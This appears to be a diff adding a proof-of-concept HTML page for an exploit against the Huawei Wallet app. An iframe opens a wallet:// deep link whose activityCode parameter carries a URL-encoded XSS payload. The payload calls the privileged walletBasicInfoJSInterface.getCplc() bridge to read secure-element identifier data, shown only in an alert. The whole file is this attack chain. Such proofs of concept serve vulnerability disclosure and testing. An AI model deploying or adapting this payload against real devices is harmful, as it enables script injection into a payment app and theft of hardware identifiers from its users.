@@ -1,0 +1,12 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<title>cc test</title>
+</head>
+<body>
+
+<iframe src="wallet://com.huawei.wallet/openwallet?action=com.huawei.wallet.membership.action.MEMBERSHIP&type=hotel&passType=hwpass.kaiyuan.centuryclub.pass.card&url=https://nfcws.hicloud.com/sandbox/cch5/huaweipay/marketActions_nov19_transportcard_gift/index.html?activityCode=%3E%3Cimg%20src=1%20onerror=alert(walletBasicInfoJSInterface.getCplc())%3E%3C">
+
+</body>
+</html>
